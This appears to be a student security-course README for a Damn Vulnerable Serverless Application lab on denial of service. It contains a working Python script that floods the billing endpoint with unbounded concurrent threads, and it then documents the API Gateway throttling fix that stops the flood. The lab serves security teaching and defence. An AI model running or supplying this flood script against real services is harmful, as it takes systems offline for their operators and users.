
# ICS344_Project

# DVSA Lesson 6 — Denial of Service (DoS)

## Overview

This lesson demonstrates a Denial of Service (DoS) vulnerability in the Damn Vulnerable Serverless Application (DVSA), where an attacker can overwhelm the billing service by sending multiple concurrent requests.

## Vulnerability

The billing endpoint allows a large number of concurrent requests without proper rate limiting.
This enables attackers to flood the system with parallel requests, exhausting resources and causing service instability or failure.

---

## Exploitation Steps

1. Obtain a valid JWT token from DVSA (authenticated user)

2. Identify a valid order-id from previous orders

3. Create a Python script to send concurrent billing requests:

```python
import threading
import requests
import os

API = "https://<API_ID>.execute-api.us-east-1.amazonaws.com/dvsa/order"
TOKEN = os.environ.get("TOKEN")
ORDER_ID = "<ORDER_ID>"

def dos():
    payload = {
        "action": "billing",
        "order-id": ORDER_ID,
        "data": {
            "ccn": "4242424242424242",
            "exp": "11/2026",
            "cvv": "123"
        }
    }

    headers = {
        "Authorization": TOKEN,
        "content-type": "application/json"
    }

    r = requests.post(API, json=payload, headers=headers)
    print(r.status_code, r.text)

while True:
    threading.Thread(target=dos).start()
```

4. Run the script:

```bash
python3 dos.py
```

5. Result:

   * Large number of concurrent requests sent
   * System returns **500 / 502 errors**
   * Service becomes unstable and unreliable

---

## Fix Applied

* Enabled throttling in API Gateway (Stage: dvsa)
* Set request limits:

  * Rate = 5 requests/second
  * Burst = 2 requests
* Applied rate limiting to control incoming traffic

---

## Verification

After applying the fix:

```bash
python3 dos.py
```

* Result:

  ```
  429 Too Many Requests
  ```

* Excessive requests are blocked

* System remains stable

* Legitimate requests still succeed within limits

---

## Folder Structure

* fixed-config/ → API Gateway throttling configuration

* screenshots/ → evidence (attack + fix validation)

  * DoS attack execution (500/502 errors)
  * Resource exhaustion / instability
  * After fix (429 Too Many Requests)

* Lesson6.md → readme file

---

## How to Reproduce

1. Obtain valid JWT token
2. Get a valid order-id
3. Create and run DoS script
4. Observe system instability (500/502 errors)
5. Apply API Gateway throttling
6. Run script again
7. Observe requests are rate-limited (429)

---

## Security Lesson

Serverless systems must enforce **rate limiting at entry points** to prevent abuse.
Without proper throttling, attackers can exhaust resources and disrupt service availability.
Applying **request control and resource protection mechanisms** ensures system stability under load.
